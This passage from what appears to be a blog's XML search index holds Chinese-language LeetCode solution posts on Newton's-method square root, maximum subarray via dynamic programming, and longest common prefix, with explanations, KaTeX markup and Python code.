encoding="application/x-tex">((x^{2}+a)/2x,0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mord">/</span><span class="mord">2</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span>，其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>a</mi><mi mathvariant="normal">/</mi><mn>2</mn><mi>x</mi></mrow><annotation encoding="application/x-tex">x^{2}+a/2x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord">/</span><span class="mord">2</span><span class="mord mathdefault">x</span></span></span></span>就是一个比 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span></span></span></span>更接近的近似值。化简后也就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mi>a</mi><mi mathvariant="normal">/</mi><mi>x</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">(x+a / x) / 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord">/</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mord">/</span><span class="mord">2</span></span></span></span>。</li><li>下面的图片可以更形象的理解这种逼近过程：<br /><img src="https://img-blog.csdnimg.cn/20191120231827785.gif#pic_center" alt="在这里插入图片描述" /></li></ul><h1 id="4-leetcode代码实现"><a class="markdownIt-Anchor" href="#4-leetcode代码实现"></a> 4 LeetCode代码实现</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mySqrt</span><span class="params">(self, x: int)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> x==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cur = x</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                pre = cur</span><br><span class="line">                cur = (cur + x/cur) / <span class="number">2</span></span><br><span class="line">                <span class="keyword">if</span> abs(pre-cur) &lt; <span class="number">1e-6</span>:</span><br><span class="line">                    <span class="keyword">return</span> int(cur)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode-53-最大子序和-动态规划法</title>
      <link href="/2020/02/21/LeetCode-53-%E6%9C%80%E5%A4%A7%E5%AD%90%E5%BA%8F%E5%92%8C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%B3%95/"/>
      <url>/2020/02/21/LeetCode-53-%E6%9C%80%E5%A4%A7%E5%AD%90%E5%BA%8F%E5%92%8C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="1-问题描述"><a class="markdownIt-Anchor" href="#1-问题描述"></a> 1 问题描述</h1><blockquote><p>给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。</p></blockquote><h1 id="2-示例"><a class="markdownIt-Anchor" href="#2-示例"></a> 2 示例</h1><blockquote><p><strong>输入</strong>：[-2,1,-3,4,-1,2,1,-5,4]<br /><strong>输出</strong>：6<br /><strong>解释</strong>：连续子数组 [4,-1,2,1] 的和最大，为 6</p></blockquote><h1 id="3-题解"><a class="markdownIt-Anchor" href="#3-题解"></a> 3 题解</h1><p><strong>我们用<kbd>动态规划</kbd>的思路来解决该问题：</strong></p><p>对数组进行遍历，用<kbd>sum</kbd>记录遍历到当前元素时，前面若干个连续子序列的最大和；用<kbd>ans</kbd>来存储最终的结果。sum和ans的初值都为数组的第一个元素</p><ul><li>若<kbd>sum &gt; 0</kbd>，则sum产生增益效果，保留sum并加上当前遍历元素</li><li>若<kbd>sum &lt;= 0</kbd>，则sum无增益效果，则舍弃sum并令sum等于当前元素，重新计算收益</li><li>每次遍历，都将sum和ans进行比较，若<kbd>sum &gt; ans</kbd>，则将ans的值更新为sum</li></ul><p><strong>这里有一种比较形象的方式来理解动态规划：</strong></p><p>假设你是一个选择性遗忘的赌徒，数组表示你这几天来赢钱或者输钱。<br />你用sum来表示之前几天来的输赢，用ans来存储你手里赢到的最多的钱.</p><ul><li>如果昨天你手上还是输钱（sum &lt; 0），你忘记它，从今天重新开始算起；</li><li>如果昨天你手上还是赢钱（sum &gt; 0），你记得它，加上今天的战绩；</li><li>及时更新ans，存储sum的最大值。</li></ul><h1 id="4-python3代码实现"><a class="markdownIt-Anchor" href="#4-python3代码实现"></a> 4 Python3代码实现</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maxSubArray</span><span class="params">(nums)</span>:</span></span><br><span class="line">sum = nums[<span class="number">0</span>]</span><br><span class="line">ans = nums[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(nums)):</span><br><span class="line"><span class="keyword">if</span> sum &gt; <span class="number">0</span>:</span><br><span class="line">sum += nums[i]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sum = nums[i]</span><br><span class="line"><span class="keyword">if</span> sum &gt; ans:</span><br><span class="line">ans = sum  </span><br><span class="line"><span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode-14-最长公共前缀</title>
      <link href="/2020/02/21/LeetCode-14-%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%89%8D%E7%BC%80/"/>
      <url>/2020/02/21/LeetCode-14-%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%89%8D%E7%BC%80/</url>
      
        <content type="html"><![CDATA[<h1 id="1-问题描述"><a class="markdownIt-Anchor" href="#1-问题描述"></a> 1 问题描述</h1><blockquote><p>编写一个函数来查找字符串数组中的<strong>最长公共前缀</strong>。<br />如果不存在公共前缀，返回空字符串 “”</p></blockquote><h1 id="2-示例"><a class="markdownIt-Anchor" href="#2-示例"></a> 2 示例</h1><blockquote><p>输入：[“flower”,“flow”,“flight”]<br />输出：“fl”</p></blockquote><h1 id="3-解法"><a class="markdownIt-Anchor" href="#3-解法"></a> 3 解法</h1><h2 id="31-解法一水平扫描法"><a class="markdownIt-Anchor" href="#31-解法一水平扫描法"></a> 3.1 解法一：水平扫描法</h2><p><strong>算法描述：</strong><br />首先，将列表中的字符串按照长度重新排序，然后依次遍历字符串<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">[</mo><msub><mi>S</mi><mn>1</mn></msub><mo>…</mo><msub><mi>S</mi><mi>n</mi></msub><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\left[S_{1} \ldots S_{n}\right]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">]</span></span></span></span></span>，首先求<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi><mi>C</mi><mi>P</mi><mrow><mo fence="true">(</mo><msub><mi>S</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>S</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">L C P\left(S_{1}, S_{2}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span>，然后求<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi><mi>C</mi><mi>P</mi><mrow><mo fence="true">(</mo><mi>L</mi><mi>C</mi><mi>P</mi><mrow><mo fence="true">(</mo><msub><mi>S</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>S</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow><mo separator="true">,</mo><msub><mi>S</mi><mn>3</mn></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">L C P\left(L C P\left(S_{1}, S_{2}\right), S_{3}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span>，依次类推：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi><mi>C</mi><mi>P</mi><mrow><mo fence="true">(</mo><msub><mi>S</mi><mn>1</mn></msub><mo>…</mo><msub><mi>S</mi><mi>n</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mi>L</mi><mi>C</mi><mi>P</mi><mrow><mo fence="true">(</mo><mi>L</mi><mi>C</mi><mi>P</mi><mrow><mo fence="true">(</mo><mi>L</mi><mi>C</mi><mi>P</mi><mrow><mo fence="true">(</mo><msub><mi>S</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>S</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow><mo separator="true">,</mo><msub><mi>S</mi><mn>3</mn></msub><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mo>…</mo><msub><mi>S</mi><mi>n</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">L C P\left(S_{1} \ldots S_{n}\right)=L C P\left(L C P\left(L C P\left(S_{1}, S_{2}\right), S_{3}\right), \ldots S_{n}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></p><p><img src="https://s2.ax1x.com/2020/02/21/3uCj2V.png" alt="" /></p><center>图 1. 查找最长公共前缀 （水平扫描法）</center><kbd>Python3实现</kbd><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">longestCommonPrefix</span><span class="params">(strs)</span>:</span></span><br><span class="line"><span class="keyword">if</span> len(strs) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">""</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">strs = sorted(strs, key=len)</span><br><span class="line">prefix = strs[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(strs)):</span><br><span class="line"><span class="keyword">while</span> strs[i].find(prefix) != <span class="number">0</span>:</span><br><span class="line">prefix = prefix[<span class="number">0</span>:len(prefix)<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">if</span> len(prefix) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">""</span></span><br><span class="line"><span class="keyword">return</span> prefix</span><br></pre></td></tr></table></figure><h2 id="32-解法二分治法"><a class="markdownIt-Anchor" href="#32-解法二分治法"></a> 3.2 解法二：分治法</h2><p><strong>算法描述</strong><br />这个算法的思路来自于LCP操作的结合律。 我们可以发现：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi><mi>C</mi><mi>P</mi><mrow><mo fence="true">(</mo><msub><mi>S</mi><mn>1</mn></msub><mo>…</mo><msub><mi>S</mi><mi>n</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mi>L</mi><mi>C</mi><mi>P</mi><mrow><mo fence="true">(</mo><mi>L</mi><mi>C</mi><mi>P</mi><mrow><mo fence="true">(</mo><msub><mi>S</mi><mn>1</mn></msub><mo>…</mo><msub><mi>S</mi><mi>k</mi></msub><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>L</mi><mi>C</mi><mi>P</mi><mrow><mo fence="true">(</mo><msub><mi>S</mi><mrow><mi>k</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>…</mo><msub><mi>S</mi><mi>n</mi></msub><mo fence="true">)</mo></mrow><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">L C P\left(S_{1} \ldots S_{n}\right)=L C P\left(L C P\left(S_{1} \ldots S_{k}\right), L C P\left(S_{k+1} \ldots S_{n}\right)\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 